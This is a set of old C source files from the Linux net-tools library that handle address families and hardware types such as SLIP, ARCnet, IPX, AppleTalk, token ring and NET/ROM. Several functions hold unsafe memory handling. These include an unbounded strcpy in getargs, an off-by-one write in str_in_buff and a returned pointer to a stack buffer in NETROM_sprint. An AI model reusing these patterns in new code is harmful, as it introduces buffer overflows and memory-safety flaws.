	struct aftrans_t *paft;
	char *tmp1, *tmp2;
	char buf[256];
		
	strncpy(buf,arg,sizeof(buf));
	buf[sizeof(buf)-1]='\0';
	
	tmp1=buf;
	
	while(tmp1) {
	
		tmp2=index(tmp1,',');

		if (tmp2)
			*(tmp2++)='\0';
			
		paft=aftrans;
		for(paft=aftrans;paft->alias;paft++) {
			if (strcmp(tmp1,paft->alias))
				continue;
			if (strlen(paft->name)+strlen(afname)+1 >= sizeof(afname)) {
				fprintf(stderr,NLS_CATGETS(catfd, libSet, lib_toomuch_af, "Too much address family arguments.\n"));				
				return(0);
			}
			if (paft->flag)
				(*paft->flag)++;
			if (afname[0])
				strcat(afname,",");
			strcat(afname,paft->name);
			break;
		}
		if (!paft->alias) {
			fprintf(stderr,NLS_CATGETS(catfd, libSet, lib_unknown_af, "Unknown address family `%s'.\n"),tmp1);			
			return(1);
		}
		tmp1=tmp2;
	}

	return(0);
}
/*
 * lib/loopback.c	This file contains the general hardware types.
 *
 * Version:	@(#)loopback.c	1.10	10/07/93
 *
 * Author:	Fred N. van Kempen, <waltje@uwalt.nl.mugnet.org>
 *		Copyright 1993 MicroWalt Corporation
 *
 *		This program is free software; you can redistribute it
 *		and/or  modify it under  the terms of  the GNU General
 *		Public  License as  published  by  the  Free  Software
 *		Foundation;  either  version 2 of the License, or  (at
 *		your option) any later version.
 */
#include "config.h"

#include <sys/types.h>
#include <sys/socket.h>
#include <linux/netdevice.h>
#include <linux/if_ether.h>
#include <linux/if_arp.h>
#include <stdlib.h>
#include <stdio.h>
#include <errno.h>
#include <ctype.h>
#include <string.h>
#include <unistd.h>
#include <linux/if.h>
#include "net-support.h"
#include "pathnames.h"
#define  EXTERN
#include "net-locale.h"


/* Display an UNSPEC address. */
static char *
pr_unspec(unsigned char *ptr)
{
  static char buff[64];
  char *pos;
  int i;

  pos = buff;
  for(i = 0; i < sizeof(struct sockaddr); i++) {
	pos += sprintf(pos, "%02X-", (*ptr++ & 0377));
  }
  buff[strlen(buff) - 1] = '\0';
  return(buff);
}


/* Display an UNSPEC socket address. */
static char *
pr_sunspec(struct sockaddr *sap)
{
  static char buf[64];

  if (sap->sa_family == 0xFFFF || sap->sa_family == 0)
    return(NLS_CATBUFF (catfd, loopbackSet, loopback_none, "[NONE SET]", buf, 64));
  return(pr_unspec(sap->sa_data));
}


struct hwtype unspec_hwtype = {
  "unspec",	NULL, /*"UNSPEC",*/		-1,		0,
  pr_unspec,	pr_sunspec,		NULL,		NULL
};

struct hwtype loop_hwtype = {
  "loop",	NULL, /*"Local Loopback",*/	255/*ARPHRD_LOOPBACK*/,	0,
  NULL,		NULL,			NULL,		NULL
};
/*
 * lib/slip.c	This file contains the SLIP HW-type support.
 *
 * Version:	slip.c	1.20 (1996-03-22)
 *
 * Author:	Fred N. van Kempen, <waltje@uwalt.nl.mugnet.org>
 *		Copyright 1993 MicroWalt Corporation
 *
 *		Modified by Alan Cox, May 94 to cover NET-3
 *
 *		This program is free software; you can redistribute it
 *		and/or  modify it under  the terms of  the GNU General
 *		Public  License as  published  by  the  Free  Software
 *		Foundation;  either  version 2 of the License, or  (at
 *		your option) any later version.
 */
#include "config.h"

#if HAVE_HWSLIP

#include <sys/types.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <linux/netdevice.h>
#include <linux/if.h>
#include <linux/if_arp.h>
#include <stdlib.h>
#include <stdio.h>
#include <ctype.h>
#include <errno.h>
#include <fcntl.h>
#include <string.h>
#include <termios.h>
#include <unistd.h>
#include "net-support.h"
#include "pathnames.h"
#define  EXTERN
#include "net-locale.h"


struct hwtype slip_hwtype = {
  "slip",	NULL, /*"Serial Line IP",*/		ARPHRD_SLIP,	0,
  NULL,		NULL,		NULL,		NULL
};
struct hwtype cslip_hwtype = {
  "cslip",	NULL, /*"VJ Serial Line IP",*/		ARPHRD_CSLIP,	0,
  NULL,		NULL,		NULL,		NULL
};
struct hwtype slip6_hwtype = {
  "slip6",	NULL, /*"6-bit Serial Line IP",*/		ARPHRD_SLIP6,	0,
  NULL,		NULL,		NULL,		NULL
};
struct hwtype cslip6_hwtype = {
  "cslip6",	NULL, /*"VJ 6-bit Serial Line IP",*/	ARPHRD_CSLIP6,	0,
  NULL,		NULL,		NULL,		NULL
};
struct hwtype adaptive_hwtype = {
  "adaptive",	NULL, /*"Adaptive Serial Line IP",*/	ARPHRD_ADAPT,0,
  NULL,		NULL,		NULL,		NULL
};
#endif	/* HAVE_HWSLIP */
/*
 * lib/getargs.c	General argument parser.
 *
 * Version:	@(#)getargs.c	4.0.1	04/05/94
 *
 * Author:      Fred N. van Kempen, <waltje@uwalt.nl.mugnet.org>
 *		Copyright 1993,1994 MicroWalt Corporation
 *
 *		This program is free software; you can redistribute it
 *		and/or  modify it under  the terms of  the GNU General
 *		Public  License as  published  by  the  Free  Software
 *		Foundation;  either  version 2 of the License, or  (at
 *		your option) any later version.
 */
#include "config.h"
#include <sys/types.h>
#include <sys/socket.h>
#include <net/if.h>
#include <errno.h>
#include <signal.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "net-support.h"
#include "pathnames.h"


/* Split the input string into multiple fields. */
int
getargs(char *string, char *arguments[])
{
  char temp[1024];
  char *sp, *ptr;
  int i, argc;
  char want;

  /*
   * Copy the string into a buffer.  We may have to modify
   * the original string because of all the quoting...
   */
  sp = string; i = 0;
  strcpy(temp, string);    
  ptr = temp;
 
  /*
   * Look for delimiters ("); if present whatever
   * they enclose will be considered one argument.
   */
  while (*ptr != '\0' && i < 32) {
	/* Ignore leading whitespace on input string. */
	while (*ptr == ' ' || *ptr == '\t') ptr++;

	/* Set string pointer. */
	arguments[i++] = sp;

	/* Check for any delimiters. */
	if (*ptr == '"' || *ptr == '\'') {
		/*
		 * Copy the string up to any whitespace OR the next
		 * delimiter. If the delimiter was escaped, skip it
		 * as it if was not there.
		 */
		want = *ptr++;
		while(*ptr != '\0') {
			if (*ptr == want && *(ptr - 1) != '\\') {
				ptr++;
				break;
			}
			*sp++ = *ptr++;
		}
	} else {
		/* Just copy the string up to any whitespace. */
		while(*ptr != '\0' && *ptr != ' ' && *ptr != '\t')
							*sp++ = *ptr++;
	}
	*sp++ = '\0';

	/* Skip trailing whitespace. */
	if (*ptr != '\0') {
		while(*ptr == ' ' || *ptr == '\t') ptr++;
	}
  }  
  argc = i;
  while (i < 32)  arguments[i++] = (char *)NULL;
  return(argc);
}
/*
 * lib/ppp.c	This file contains the SLIP support for the NET-2 base
 *		distribution.
 *
 * Version:	@(#)slip.c	1.10	10/07/93
 *
 * Author:	Fred N. van Kempen, <waltje@uwalt.nl.mugnet.org>
 *		Copyright 1993 MicroWalt Corporation
 *
 *		Modified by Alan Cox, May 94 to cover NET-3
 *
 *		This program is free software; you can redistribute it
 *		and/or  modify it under  the terms of  the GNU General
 *		Public  License as  published  by  the  Free  Software
 *		Foundation;  either  version 2 of the License, or  (at
 *		your option) any later version.
 */
#include "config.h"

#if HAVE_HWPPP

#include <sys/types.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <linux/netdevice.h>
#include <linux/if.h>
#include <linux/if_arp.h>
#include <stdlib.h>
#include <stdio.h>
#include <ctype.h>
#include <errno.h>
#include <fcntl.h>
#include <string.h>
#include <termios.h>
#include <unistd.h>
#include "net-support.h"
#include "pathnames.h"
#define  EXTERN
#include "net-locale.h"


/* Start the PPP encapsulation on the file descriptor. */
static int
do_ppp(int fd)
{
	fprintf(stderr,NLS_CATGETS(catfd, pppSet, ppp_cant_start, "You cannot start PPP with this program.\n"));
        return -1;
}




struct hwtype ppp_hwtype = {
  "ppp",	NULL, /*"Point-Point Protocol",*/		ARPHRD_PPP,	0,
  NULL,		NULL,		NULL,		do_ppp
};


#endif	/* HAVE_PPP */
/*
 * lib/arcnet.c	This file contains an implementation of the "ARCnet"
 *		support functions for the NET-2 base distribution.
 *
 * Version:	@(#)arcnet.c	1.10	10/07/93
 *
 * Author:	Fred N. van Kempen, <waltje@uwalt.nl.mugnet.org>
 *		Copyright 1993 MicroWalt Corporation
 *
 *		This program is free software; you can redistribute it
 *		and/or  modify it under  the terms of  the GNU General
 *		Public  License as  published  by  the  Free  Software
 *		Foundation;  either  version 2 of the License, or  (at
 *		your option) any later version.
 */
#include "config.h"

#if HAVE_HWARC
#include <sys/types.h>
#include <sys/socket.h>
#include <linux/netdevice.h>
#include <linux/if_ether.h>
#include <linux/if_arp.h>
#include <stdlib.h>
#include <stdio.h>
#include <errno.h>
#include <ctype.h>
#include <string.h>
#include <unistd.h>
#include "net-support.h"
#include "pathnames.h"
#define  EXTERN
#include "net-locale.h"


extern struct hwtype arcnet_hwtype;


/* Display an ARCnet address in readable format. */
static char *
pr_arcnet(unsigned char *ptr)
{
  static char buff[64];

  sprintf(buff, "%02X",(ptr[0] & 0377));
  return(buff);
}


/* Display an ARCnet socket address. */
static char *
pr_sarcnet(struct sockaddr *sap)
{
  static char buf[64];

  if (sap->sa_family == 0xFFFF || sap->sa_family == 0)
    return(NLS_CATBUFF (catfd, arcnetSet, arcnet_none, "[NONE SET]", buf, 64));
  return(pr_arcnet(sap->sa_data));
}


/* Input an ARCnet address and convert to binary. */
static int
in_arcnet(char *bufp, struct sockaddr *sap)
{
  unsigned char *ptr;
  char c, *orig;
  int i, val;

  sap->sa_family = arcnet_hwtype.type;
  ptr = sap->sa_data;

  i = 0;
  orig = bufp;
  while((*bufp != '\0') && (i < 1)) {
	val = 0;
	c = *bufp++;
	if (isdigit(c)) val = c - '0';
	  else if (c >= 'a' && c <= 'f') val = c - 'a' + 10;
	  else if (c >= 'A' && c <= 'F') val = c - 'A' + 10;
	  else {
#ifdef DEBUG
		fprintf(stderr, NLS_CATGETS(catfd, arcnetSet, arcnet_debug1,
					    "in_arcnet(%s): invalid arcnet address!\n"), orig);
#endif
		errno = EINVAL;
		return(-1);
	}
	val <<= 4;
	c = *bufp++;
	if (isdigit(c)) val |= c - '0';
	  else if (c >= 'a' && c <= 'f') val |= c - 'a' + 10;
	  else if (c >= 'A' && c <= 'F') val |= c - 'A' + 10;
	  else {
#ifdef DEBUG
		fprintf(stderr, NLS_CATGETS(catfd, arcnetSet, arcnet_debug2,
					    "in_arcnet(%s): invalid arcnet address!\n"), orig);
#endif
		errno = EINVAL;
		return(-1);
	}
	*ptr++ = (unsigned char) (val & 0377);
	i++;

	/* We might get a semicolon here - not required. */
	if (*bufp == ':') {
		if (i == ETH_ALEN) {
#ifdef DEBUG
			fprintf(stderr, NLS_CATGETS(catfd, arcnetSet, arcnet_debug3,
						    "in_arcnet(%s): trailing : ignored!\n"),
									orig)
#endif
						; /* nothing */
		}
		bufp++;
	}
  }

  /* That's it.  Any trailing junk? */
  if ((i == ETH_ALEN) && (*bufp != '\0')) {
#ifdef DEBUG
	fprintf(stderr, NLS_CATGETS(catfd, arcnetSet, arcnet_debug4, "in_arcnet(%s): trailing junk!\n"), orig);
	errno = EINVAL;
	return(-1);
#endif
  }

#ifdef DEBUG
  fprintf(stderr, "in_arcnet(%s): %s\n", orig, pr_arcnet(sap->sa_data));
#endif

  return(0);
}


struct hwtype arcnet_hwtype = {
  "arcnet",	NULL, /*"2.5Mbps ARCnet",*/		ARPHRD_ARCNET,	1,
  pr_arcnet,	pr_sarcnet,	in_arcnet,	NULL
};


#endif	/* HAVE_HWARC */
/*
 *		IPX protocol output functions.
 *		[Not yet input]
 *
 *			Alan Cox  <Alan.Cox@linux.org>
 *
 *		This program is free software; you can redistribute it
 *		and/or  modify it under  the terms of  the GNU General
 *		Public  License as  published  by  the  Free  Software
 *		Foundation;  either  version 2 of the License, or  (at
 *		your option) any later version.
 */
#include "config.h"

#if HAVE_AFIPX
#include <sys/types.h>
#include <sys/socket.h>
#include <linux/ipx.h>
#include <stdlib.h>
#include <stdio.h>
#include <errno.h>
#include <ctype.h>
#include <string.h>
#include <unistd.h>
#include <netinet/in.h>
#include "version.h"
#include "net-support.h"
#include "pathnames.h"
#define  EXTERN
#include "net-locale.h"

#if (IPX_NODE_LEN != 6)
#error "IPX_NODE_LEN != 6"
#endif

/* Display a ipx domain address. */
static char *
IPX_print(unsigned char *ptr)
{
  static char buff[64];
  struct sockaddr_ipx *sipx=(struct sockaddr_ipx *)(ptr-2);
  int t;

  
  for(t=IPX_NODE_LEN;t;t--)
    if (sipx->sipx_node[t-1])
      break;

  if (t && ntohl(sipx->sipx_network))   
    sprintf(buff,"%08lX:%02X%02X%02X%02X%02X%02X",
  	ntohl(sipx->sipx_network),
  	(int)sipx->sipx_node[0],(int)sipx->sipx_node[1],
  	(int)sipx->sipx_node[2],(int)sipx->sipx_node[3],
  	(int)sipx->sipx_node[4],(int)sipx->sipx_node[5]);
  else if (!t && ntohl(sipx->sipx_network))
    sprintf(buff,"%08lX", ntohl(sipx->sipx_network));
  else if (t && !ntohl(sipx->sipx_network))
    sprintf(buff,"%02X%02X%02X%02X%02X%02X",
  	(int)sipx->sipx_node[0],(int)sipx->sipx_node[1],
  	(int)sipx->sipx_node[2],(int)sipx->sipx_node[3],
  	(int)sipx->sipx_node[4],(int)sipx->sipx_node[5]);
  else
  	buff[0] = '\0';
  return(buff);
}


/* Display a ipx domain address. */
static char *
IPX_sprint(struct sockaddr *sap, int numeric)
{
  static char buf[64];

  if (sap->sa_family != AF_IPX)
    return(NLS_CATBUFF (catfd, ipxSet, ipx_none, "[NONE SET]", buf, 64));
  return(IPX_print(sap->sa_data));
}


static int
IPX_getsock(char *bufp, struct sockaddr *sap)
{
  char *sp = bufp,*bp;
  int i;
  unsigned char val;
  struct sockaddr_ipx *sipx=(struct sockaddr_ipx *) sap;
  
  sipx->sipx_port   = 0;

  val = 0;
  bp=(char *)sipx->sipx_node;
  for (i = 0; i < sizeof(sipx->sipx_node); i++) {
	*sp = toupper(*sp);
	
	if ((*sp >= 'A') && (*sp <= 'F')) 
		bp[i] |= (int) (*sp - 'A') + 10;
	else if ((*sp >= '0') && (*sp <= '9'))
		bp[i] |= (int) (*sp - '0');
	else
		return(-1);

	bp[i] <<= 4;
	sp++;
	*sp = toupper(*sp);
	
	if ((*sp >= 'A') && (*sp <= 'F')) 
		bp[i] |= (int) (*sp - 'A') + 10;
	else if ((*sp >= '0') && (*sp <= '9'))
		bp[i] |= (int) (*sp - '0');
	else
		return(-1);
	
	sp++;
    }
    if ((memcmp(sipx->sipx_node, "\0\0\0\0\0\0\0\0", IPX_NODE_LEN) == 0) ||
        (memcmp(sipx->sipx_node, "\377\377\377\377\377\377", IPX_NODE_LEN) == 0))
	return(-1);
                             
    return(0);
}

/* XXX define type which makes verbose format checks AF_input*/

static int
IPX_input(int type, char *bufp, struct sockaddr *sap)
{
  struct sockaddr_ipx	*sai=(struct sockaddr_ipx *)sap;
  unsigned long netnum;
  char *ep;
  int nbo;
  
  sai->sipx_family = AF_IPX;
  sai->sipx_network = htonl(0);
  sai->sipx_node[0] = sai->sipx_node[1] = sai->sipx_node[2] = 
  sai->sipx_node[3] = sai->sipx_node[4] = sai->sipx_node[5] = '\0';
  sai->sipx_port = 0;
   
  if (type & 4)
  	nbo = 1;
  else
  	nbo = 0;
  
  type &= 3;
  if (type <= 1) {
  	netnum = strtoul(bufp,&ep,16);
	if ((netnum == 0xffffffffL) || (netnum == 0L))
		return(-1);
	if (nbo)
		sai->sipx_network = netnum;
	else
		sai->sipx_network = htonl(netnum);
  }
  if (type == 1) {
  	if (*ep != '\0')
  		return(-2);
  	return(0);
  }
  if (type == 0) {
  	if (*ep != ':')
  		return(-3);
  	bufp=ep+1;
  }
  return(IPX_getsock(bufp,sap));
}


struct aftype ipx_aftype = {
  "ipx",	NULL, /*"IPX",*/		AF_IPX,	0,
  IPX_print,	IPX_sprint,		IPX_input,		NULL,
  NULL/*IPX_rprint*/
};

#endif
/*
 *		DDP protocol output functions.
 *		[Not yet input]
 *
 *			Alan Cox  <Alan.Cox@linux.org>
 *
 *		This program is free software; you can redistribute it
 *		and/or  modify it under  the terms of  the GNU General
 *		Public  License as  published  by  the  Free  Software
 *		Foundation;  either  version 2 of the License, or  (at
 *		your option) any later version.
 */
#include "config.h"

#if HAVE_AFATALK
#include <sys/types.h>
#include <sys/socket.h>
#include <linux/atalk.h>
#include <stdlib.h>
#include <stdio.h>
#include <errno.h>
#include <ctype.h>
#include <string.h>
#include <unistd.h>
#include <netinet/in.h>
#include "net-support.h"
#include "pathnames.h"
#define  EXTERN
#include "net-locale.h"


/* Display a ddp domain address. */
static char *
ddp_print(unsigned char *ptr)
{
  static char buff[64];
  struct sockaddr_at *sat=(struct sockaddr_at *)(ptr-2);
  sprintf(buff,"%d/%d",(int) ntohs(sat->sat_addr.s_net), (int)sat->sat_addr.s_node);
  return(buff);
}


/* Display a ddp domain address. */
static char *
ddp_sprint(struct sockaddr *sap, int numeric)
{
  static char buf[64];

  if (sap->sa_family != AF_APPLETALK)
    return(NLS_CATBUFF (catfd, ddpSet, ddp_none, "[NONE SET]", buf, 64));
  return(ddp_print(sap->sa_data));
}


struct aftype ddp_aftype = {
  "ddp",	NULL, /*"Appletalk DDP",*/	AF_APPLETALK,	0,
  ddp_print,	ddp_sprint,		NULL,		NULL,
  NULL/*DDP_rprint*/
};

#endif
/*-
 * This file is part of a file of tcsh-6.05 used for the purpose of
 * string handling. It is given ``as it is'' with its copyright.
 *
 * -----------------------------------------------------------------------
 * Copyright (c) 1980, 1991 The Regents of the University of California.
 * All rights reserved.
 *
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions
 * are met:
 * 1. Redistributions of source code must retain the above copyright
 *    notice, this list of conditions and the following disclaimer.
 * 2. Redistributions in binary form must reproduce the above copyright
 *    notice, this list of conditions and the following disclaimer in the
 *    documentation and/or other materials provided with the distribution.
 * 3. All advertising materials mentioning features or use of this software
 *    must display the following acknowledgement:
 *	This product includes software developed by the University of
 *	California, Berkeley and its contributors.
 * 4. Neither the name of the University nor the names of its contributors
 *    may be used to endorse or promote products derived from this software
 *    without specific prior written permission.
 *
 * THIS SOFTWARE IS PROVIDED BY THE REGENTS AND CONTRIBUTORS ``AS IS'' AND
 * ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
 * IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
 * ARE DISCLAIMED.  IN NO EVENT SHALL THE REGENTS OR CONTRIBUTORS BE LIABLE
 * FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL
 * DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS
 * OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
 * HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT
 * LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY
 * OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF
 * SUCH DAMAGE.
 */

#include <stdio.h>
#include <stdlib.h>
#include <strings.h>
#ifndef FREEBSD
#include <malloc.h>
#endif

#ifdef xmalloc
#undef xmalloc
#endif
#define xmalloc    malloc

char   *
strsave(s)
    register const char *s;
{
    char   *n;
    register char *p;

    if (s == NULL)
	s = (const char *) "";
    for (p = (char *) s; *p++ != '\0';)
	continue;
    n = p = (char *) xmalloc((size_t)
			     ((((const char *) p) - s) * sizeof(char)));
    while ((*p++ = *s++) != '\0')
	continue;
    return (n);
}


char *str_in_buff (char *buff, int len, char *string)
{
  if (string)
    if (strlen (string) >= len) /* does not include \0 */
      {
	strncpy (buff, string, len-1);
	buff[len] = '\0';
      }
    else
      strcpy (buff, string);
  else
    strcpy (buff, "");

  return (buff);
}
/*
 * lib/tr.c	This file contains an implementation of the "Ethernet"
 *		support functions for the NET-2 base distribution.
 *
 * Version:	@(#)tr.c	1.10	10/07/93
 *
 * Author:	Fred N. van Kempen, <waltje@uwalt.nl.mugnet.org>
 *		Copyright 1993 MicroWalt Corporation
 *
 *		This program is free software; you can redistribute it
 *		and/or  modify it under  the terms of  the GNU General
 *		Public  License as  published  by  the  Free  Software
 *		Foundation;  either  version 2 of the License, or  (at
 *		your option) any later version.
 */
#include "config.h"

#if HAVE_HWTR
#include <sys/types.h>
#include <sys/socket.h>
#include <linux/netdevice.h>
#include <linux/if_tr.h>
#include <linux/if_arp.h>
#include <stdlib.h>
#include <stdio.h>
#include <errno.h>
#include <ctype.h>
#include <string.h>
#include <unistd.h>
#include "net-support.h"
#include "pathnames.h"


extern struct hwtype tr_hwtype;


/* Display an Ethernet address in readable format. */
static char *
pr_tr(unsigned char *ptr)
{
  static char buff[64];

  sprintf(buff, "%02X:%02X:%02X:%02X:%02X:%02X",
	(ptr[0] & 0377), (ptr[1] & 0377), (ptr[2] & 0377),
	(ptr[3] & 0377), (ptr[4] & 0377), (ptr[5] & 0377)
  );
  return(buff);
}


/* Display an Ethernet socket address. */
static char *
pr_str(struct sockaddr *sap)
{
  if (sap->sa_family == 0xFFFF || sap->sa_family == 0) return("[NONE SET]");
  return(pr_tr(sap->sa_data));
}


/* Input an Ethernet address and convert to binary. */
static int
in_tr(char *bufp, struct sockaddr *sap)
{
  unsigned char *ptr;
  char c, *orig;
  int i, val;

  sap->sa_family = tr_hwtype.type;
  ptr = sap->sa_data;

  i = 0;
  orig = bufp;
  while((*bufp != '\0') && (i < TR_ALEN)) {
	val = 0;
	c = *bufp++;
	if (isdigit(c)) val = c - '0';
	  else if (c >= 'a' && c <= 'f') val = c - 'a' + 10;
	  else if (c >= 'A' && c <= 'F') val = c - 'A' + 10;
	  else {
#ifdef DEBUG
		fprintf(stderr, "in_tr(%s): invalid token ring address!\n", orig);
#endif
		errno = EINVAL;
		return(-1);
	}
	val <<= 4;
	c = *bufp++;
	if (isdigit(c)) val |= c - '0';
	  else if (c >= 'a' && c <= 'f') val |= c - 'a' + 10;
	  else if (c >= 'A' && c <= 'F') val |= c - 'A' + 10;
	  else {
#ifdef DEBUG
		fprintf(stderr, "in_tr(%s): invalid token ring address!\n", orig);
#endif
		errno = EINVAL;
		return(-1);
	}
	*ptr++ = (unsigned char) (val & 0377);
	i++;

	/* We might get a semicolon here - not required. */
	if (*bufp == ':') {
		if (i == TR_ALEN) {
#ifdef DEBUG
			fprintf(stderr, "in_tr(%s): trailing : ignored!\n",
									orig)
#endif
						; /* nothing */
		}
		bufp++;
	}
  }

  /* That's it.  Any trailing junk? */
  if ((i == TR_ALEN) && (*bufp != '\0')) {
#ifdef DEBUG
	fprintf(stderr, "in_tr(%s): trailing junk!\n", orig);
	errno = EINVAL;
	return(-1);
#endif
  }

#ifdef DEBUG
  fprintf(stderr, "in_tr(%s): %s\n", orig, pr_tr(sap->sa_data));
#endif

  return(0);
}


struct hwtype tr_hwtype = {
  "tr",	"16/4 Mbps TR",		ARPHRD_IEEE802,	TR_ALEN,
  pr_tr,	pr_str,	in_tr,	NULL
};


#endif	/* HAVE_HWTR */
/*
 * lib/netrom.c	This file contains an implementation of the "NET/ROM"
 *		support functions for the NET-2 base distribution.
 *
 * Version:	@(#)netrom.c	1.20	12/16/93
 *
 * NOTE:	I will redo this module as soon as I got the libax25.a
 *		library sorted out.  This library contains some useful
 *		and often used address conversion functions, database
 *		lookup stuff, and more of the like.
 *
 * Author:	Fred N. van Kempen, <waltje@uwalt.nl.mugnet.org>
 *		Copyright 1993 MicroWalt Corporation
 *
 *		This program is free software; you can redistribute it
 *		and/or  modify it under  the terms of  the GNU General
 *		Public  License as  published  by  the  Free  Software
 *		Foundation;  either  version 2 of the License, or  (at
 *		your option) any later version.
 */
#include "config.h"

#if HAVE_AFNETROM || HAVE_HWNETROM
#include <sys/types.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <linux/netdevice.h>
#include <linux/ax25.h>
#include <linux/netrom.h>
#include <linux/if_arp.h>	/* ARPHRD_NETROM */
#include <stdlib.h>
#include <stdio.h>
#include <ctype.h>
#include <errno.h>
#include <fcntl.h>
#include <string.h>
#include <termios.h>
#include <unistd.h>
#include "net-support.h"
#include "pathnames.h"
#define EXTERN
#include "net-locale.h"

static char netrom_errmsg[128];


extern struct aftype netrom_aftype;


static char *
NETROM_print(unsigned char *ptr)
{
  static char buff[8];
  int i;

  for (i = 0; i < 6; i++) {
	buff[i] = ((ptr[i] & 0377) >> 1);
	if (buff[i] == ' ') buff[i] = '\0';
  }
  buff[6] = '\0';
  i = ((ptr[6] & 0x1E) >> 1);
  if (i != 0) sprintf(&buff[strlen(buff)], "-%d", i);
  return(buff);
}


/* Display an AX.25 socket address. */
static char *
NETROM_sprint(struct sockaddr *sap, int numeric)
{
  char buf[64];
  if (sap->sa_family == 0xFFFF || sap->sa_family == 0) 
    return(NLS_CATBUFF (catfd, netromSet, netrom_none, "[NONE SET]", buf, 64));
  return(NETROM_print(((struct sockaddr_ax25 *)sap)->sax25_call.ax25_call));
}


static int
NETROM_input(int type, char *bufp, struct sockaddr *sap)
{
  unsigned char *ptr;
  char *orig, c;
  int i;

  sap->sa_family = netrom_aftype.af;
  ptr = ((struct sockaddr_ax25 *)sap)->sax25_call.ax25_call;

  /* First, scan and convert the basic callsign. */
  orig = bufp;
  i = 0;
  while((*bufp != '\0') && (*bufp != '-') && (i < 6)) {
	c = *bufp++;
	if (islower(c)) c = toupper(c);
	if (! (isupper(c) || isdigit(c))) {
		strcpy(netrom_errmsg, NLS_CATGETS (catfd, netromSet, netrom_debug1, "Invalid callsign"));
#ifdef DEBUG
		fprintf(stderr, "netrom_input(%s): %s !\n", netrom_errmsg, orig);
#endif
		errno = EINVAL;
		return(-1);
	}
	*ptr++ = (unsigned char) ((c << 1) & 0xFE);
	i++;
  }

  /* Callsign too long? */
  if ((i == 6) && (*bufp != '-') && (*bufp != '\0')) {
	strcpy(netrom_errmsg, NLS_CATGETS (catfd, netromSet, netrom_debug2, "Callsign too long"));
#ifdef DEBUG
	fprintf(stderr, "netrom_input(%s): %s !\n", netrom_errmsg, orig);
#endif
	errno = E2BIG;
	return(-1);
  }

  /* Nope, fill out the address bytes with blanks. */
  while (i++ < sizeof(ax25_address)-1) {
	*ptr++ = (unsigned char) ((' ' << 1) & 0xFE);
  }

  /* See if we need to add an SSID field. */
  if (*bufp == '-') {
	i = atoi(++bufp);
	*ptr = (unsigned char) ((i << 1) & 0xFE);
  } else {
	*ptr = (unsigned char) '\0';
  }

  /* All done. */
#ifdef DEBUG
  fprintf(stderr, "netrom_input(%s): ", orig);
  for (i = 0; i < sizeof(ax25_address); i++)
	fprintf(stderr, "%02X ", sap->sa_data[i] & 0377);
  fprintf(stderr, "\n");
#endif

  return(0);
}


/* Display an error message. */
static void
NETROM_herror(char *text)
{
  if (text == NULL) fprintf(stderr, "%s\n", netrom_errmsg);
    else fprintf(stderr, "%s: %s\n", text, netrom_errmsg);
}


static char *
NETROM_hprint(struct sockaddr *sap)
{
  if (sap->sa_family == 0xFFFF || sap->sa_family == 0) return("[NONE SET]");
  return(NETROM_print(((struct sockaddr_ax25 *)sap)->sax25_call.ax25_call));
}


static int
NETROM_hinput(char *bufp, struct sockaddr *sap)
{
  if (NETROM_input(0, bufp, sap) < 0) return(-1);
  sap->sa_family = ARPHRD_NETROM;
  return(0);
}

#if 0
/* Set the line discipline of a terminal line. */
static int
KISS_set_disc(int fd, int disc)
{
  if (ioctl(fd, TIOCSETD, &disc) < 0) {
	fprintf(stderr, "KISS_set_disc(%d): %s\n", disc, strerror(errno));
	return(-errno);
  }
  return(0);
}


/* Start the KISS encapsulation on the file descriptor. */
static int
KISS_init(int fd)
{
  if (KISS_set_disc(fd, N_SLIP) < 0) return(-1);
  if (ioctl(fd, SIOCSIFENCAP, 4) <0) return(-1);
  return(0);
}
#endif

struct hwtype netrom_hwtype = {
  "netrom",	"AMPR NET/ROM",		ARPHRD_NETROM,	7,
  NETROM_print,	NETROM_hprint,		NETROM_hinput,	NULL
};

struct aftype netrom_aftype = {
  "netrom",	"AMPR NET/ROM",		AF_NETROM,	7,
  NETROM_print,	NETROM_sprint,		NETROM_input,	NETROM_herror,	
  NULL/*NETROM_rprint*/
};


#endif	/* HAVE_AFNETROM */
/*
 *	Tunnel.c, Alan Cox 1995.
 *
 */
 
#include "config.h"

#if HAVE_HWTUNNEL
#include <sys/types.h>
#include <sys/socket.h>
#include <linux/netdevice.h>
#include <linux/if_ether.h>
#include <linux/if_arp.h>
#include <stdlib.h>
#include <stdio.h>
#include <errno.h>
#include <ctype.h>
#include <string.h>
#include <unistd.h>
#include "net-support.h"
#include "pathnames.h"
#define  EXTERN
#include "net-locale.h"


extern struct hwtype ether_hwtype;


static char *
pr_tunnel(unsigned char *ptr)
{
  return("");
}


static char *pr_stunnel(struct sockaddr *sap)
{
  return("");
}


static int
in_tunnel(char *bufp, struct sockaddr *sap)
{
  return(-1);
}


struct hwtype tunnel_hwtype = {
  "tunnel",	NULL, /*"IPIP Tunnel",*/	ARPHRD_TUNNEL,	0,
  pr_tunnel,	pr_stunnel,	in_tunnel,	NULL
};


#endif	/* HAVE_HWTUNNEL */
/*
 * lib/setroute.c	This file contains a small interface function to
 *			use the AF specific input routine for the routing
 *			table.
 *
 * NET-LIB	A collection of functions used from the base set of the
 *		NET-3 Networking Distribution for the LINUX operating
 *		system. (net-tools, net-drivers)
 *
 * Version:	lib/setroute.c 0.02 (1996-04-13)
 *
 * Author:	Bernd 'eckes' Eckenfels <net-tools@lina.inka.de>
 *		Copyright 1999 Bernd Eckenfels, Germany
 *
 * Modifications:
 *
 *960221 {0.01} Bernd Eckenfels:	generated from getroute.c
